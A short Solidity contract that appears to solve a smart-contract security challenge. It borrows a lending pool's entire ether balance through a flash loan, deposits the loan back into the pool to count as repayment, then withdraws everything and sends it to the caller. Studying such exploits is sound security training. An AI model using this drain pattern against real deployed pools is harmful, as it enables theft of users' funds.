// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;
import "@openzeppelin/contracts/utils/Address.sol";

import "hardhat/console.sol";

interface ITrusterLenderPool {
    function flashLoan(uint256 amount) external;

    function deposit() external payable;

    function withdraw() external;
}

contract FlashLoanEtherReceiver {
    ITrusterLenderPool pool;

    constructor(address poolAddr) {
        pool = ITrusterLenderPool(poolAddr);
    }

    function exploit() public {
        pool.flashLoan(address(pool).balance);

        pool.withdraw();

        payable(msg.sender).call{value: address(this).balance}("");
    }

    function execute() external payable {
        ITrusterLenderPool(msg.sender).deposit{value: msg.value}();
    }

    receive() external payable {}
}
